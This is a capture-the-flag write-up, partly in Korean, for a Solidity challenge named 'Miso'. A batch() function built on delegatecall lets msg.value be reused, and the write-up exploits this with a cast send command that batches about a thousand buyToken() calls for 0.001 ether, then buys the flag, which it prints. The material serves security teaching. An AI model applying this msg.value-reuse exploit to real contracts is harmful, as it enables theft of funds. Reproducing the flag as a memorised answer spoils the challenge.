# Intermediate: 4. miso



**Mission**

Batch functions in Solidity can be used to save on gas costs by bundling multiple operations into a single transaction. However, if not implemented correctly, they can introduce significant vulnerabilities - [contract](https://sepolia.scrollscan.com/address/0xF6b273eB09007BEFeD0644e97fDA2308bf161858)

```solidity
pragma solidity =0.8.27;

contract Miso {
    mapping(address => bool) public flag;
    mapping(address user => uint256 balance) public balances;

    function balanceOf(address user) external view returns (uint256) {
        return balances[user];
    }

    function transfer(address recipient, uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient balance");
        balances[msg.sender] -= amount;
        balances[recipient] += amount;
    }

    function buyToken() external payable {
        require(msg.value == 0.001 ether, "invalid value");
        balances[msg.sender] += msg.value * 1000;
    }

    function batch(
        bytes[] calldata calls
    ) external payable returns (bytes[] memory results) {
        results = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(
                calls[i]
            );
            require(success, "delegatecall failed");
            results[i] = result;
        }
    }

    function buyFlag() external payable {
        require(balances[msg.sender] >= 1000 ether, "insufficient balance");
        flag[msg.sender] = true;
        balances[msg.sender] = 0;
    }
}
```

batch transaction을 사용하면 gas를 줄일 수 있으나, 주의해야 한다.

만약 Attacker가 batch로 buyToken()함수를 여러번 호출한다고 생각해보자. buyToken은 msg.value * 1000만큼 balance로 저장하는데, batch함수로 buyToken을 여러번 한다면 msg.value를 재사용하게 된다. 즉 실제로는 한번 0.001 ether을 보내지만, 만약 batch로 1000번 buyToken()을 한다면 실제로는 0.001 ether * 1000, 즉 1 ether를 보낸 것과 같이 balance를 조작할 수 있다. 

check buyToken() func signature:

```solidity
cast calldata "buyToken()"     
```

result:

```solidity
0xa4821719
```

우리는 0.001 ether을 보낼 수 있고, balance를 1000ether로 만들려면 총 1000번의 buyToken을 호출해야 한다.

command:

```solidity
cast send 0xF6b273eB09007BEFeD0644e97fDA2308bf161858 "batch(bytes[])" "[0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719, 0xa4821719]" --value 0.001ether --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY
```

buyFlag:

```solidity
cast send 0xF6b273eB09007BEFeD0644e97fDA2308bf161858 "buyFlag()" --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY 
```

Flag:

```solidity
ethcon2024{https://mudit.BLOG/miso-war-room/}
```